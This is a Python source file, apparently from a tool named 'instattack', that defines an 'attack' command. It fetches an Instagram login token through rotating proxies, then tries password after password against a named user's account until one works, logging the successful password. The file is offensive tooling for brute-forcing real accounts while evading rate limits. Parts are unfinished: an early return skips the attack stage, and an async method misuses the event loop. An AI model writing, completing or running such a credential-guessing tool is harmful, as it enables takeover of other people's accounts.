import asyncio
from plumbum import cli

from instattack.exceptions import AppException
from instattack.models import User

from instattack.handlers import (
    ProxyHandler, TokenHandler, ResultsHandler, PasswordHandler)

from .base import Instattack
from .args import RequestArgs, ProxyArgs


@Instattack.subcommand('attack')
class InstattackAttack(Instattack, RequestArgs, ProxyArgs):

    __group__ = 'Instattack Attack'
    __name__ = 'Attack Command'

    _token_max_fetch_time = cli.SwitchAttr(
        "--token_max_fetch_time", float,
        default=10.0,
        group=__group__,
    )

    _pwlimit = cli.SwitchAttr(
        "--pwlimit", int,
        default=None,
        group=__group__,
    )

    def main(self, username):
        self.user = User(username)
        self.user.setup()

        with self.loop_session() as loop:

            token = loop.run_until_complete(self.get_token(loop))
            if not token:
                raise AppException("Token should not be null.")

            self.log.info('Received Token', extra={'token': token})
            return
            loop.run_until_complete(self.attack(loop, token))

    async def get_token(self, loop):
        """
        Uses proxies specifically for GET requests to synchronously make
        requests to the INSTAGRAM_URL until a valid response is received with
        a token that can be used for subsequent stages.

        TODO:
        ----
        Do we really want to save proxies?

        NOTE:
        -----
        We cannot perform any actions in finally because if we hit an exception,
        the loop will have been shutdown by that point.

        It's possible that the proxy handler was not started fully before
        exception was raised - in which case we can't double stop it.

        Proxies will not be saved if it wasn't started, but that is probably
        desired behavior.
        """
        get_proxy_handler, token_handler = self.get_handlers()

        try:
            results = await asyncio.gather(
                token_handler.run(loop),
                get_proxy_handler.run(loop, prepopulate=True),
            )
        # This can happen when shutting down due to an early error in the token
        # handler or proxy handler.
        # except asyncio.CancelledError:
        #     pass
        except Exception as e:
            # Do we really want to save proxies?
            if not get_proxy_handler.stopped:
                await get_proxy_handler.stop(loop, save=True)

            # We need to force the shutdown with the exception handler.
            self.handle_exception(loop, context={'exception': e})
        else:
            await get_proxy_handler.stop(loop, save=True)
            return results[0]

    async def attack(self, loop, token):
        """
        Uses the token retrieved from the initial phase of the command to
        iteratively try each password for the given user with the provided
        token until a successful response is achieved for each password or
        a successful authenticated response is achieved for any password.

        TODO:
        ----
        Do we really want to save proxies?  If we do, we should filter out
        proxies that have a certain amount of errors.

        NOTE:
        -----
        We cannot perform any actions in finally because if we hit an exception,
        the loop will have been shutdown by that point.

        It's possible that the proxy handler was not started fully before
        exception was raised - in which case we can't double stop it.

        Proxies will not be saved if it wasn't started, but that is probably
        desired behavior.
        """
        results_handler, post_proxy_handler, password_handler = self.post_handlers(self.user)
        try:
            results = loop.run_until_complete(asyncio.gather(
                results_handler.run(loop),
                password_handler.run(loop, token, password_limit=self._pwlimit),
                post_proxy_handler.run(loop, prepopulate=True),
            ))

        except Exception as e:
            # Do we really want to save POST proxies?
            if not post_proxy_handler.stopped:
                await post_proxy_handler.stop(loop, save=True)

            # TODO: Is there a chance that the results handler or password
            # handle was already stopped?

            # Save Attempts Up Until This Point
            await results_handler.stop(loop, save=True)
            await password_handler.stop(loop)

            # We need to force the shutdown with the exception handler.
            self.handle_exception(loop, context={'exception': e})

        else:
            # TODO: Do we really want to save proxies?
            # Proxy handler should not be stopped by this point.
            await post_proxy_handler.stop(loop, save=True)

            # Save All Attempts
            await results_handler.stop(loop, save=True)
            await password_handler.stop(loop)

            # Post Proxy Server Stopped Automatically
            result = results[0]
            if result:
                self.log.info(f'Authenticated User!', extra={
                    'password': result.context.password
                })

    def get_handlers(self):
        config = self.request_config(method='GET')
        config['token_max_fetch_time'] = self._token_max_fetch_time

        lock = asyncio.Lock()
        start_event = asyncio.Event()

        proxy_handler = ProxyHandler(
            method='GET',
            lock=lock,
            start_event=start_event,
            **self.proxy_config(method='GET')
        )
        token_handler = TokenHandler(
            proxy_handler,
            start_event=start_event,
            **config
        )
        return proxy_handler, token_handler

    def post_handlers(self, user):
        lock = asyncio.Lock()
        auth_result_found = asyncio.Event()
        results = asyncio.Queue()

        # We actually don't need to provide the lock to the password
        # and token handlers I think, since they don't access _pool directly.
        results_handler = ResultsHandler(
            user=self.user,
            queue=results,
            stop_event=auth_result_found
        )
        proxy_handler = ProxyHandler(
            method='POST',
            lock=lock,
            **self.proxy_config(method='POST')
        )
        password_handler = PasswordHandler(
            results,
            proxy_handler,
            user=self.user,
            stop_event=auth_result_found,
            **self.request_config(method='POST')
        )
        return results_handler, proxy_handler, password_handler
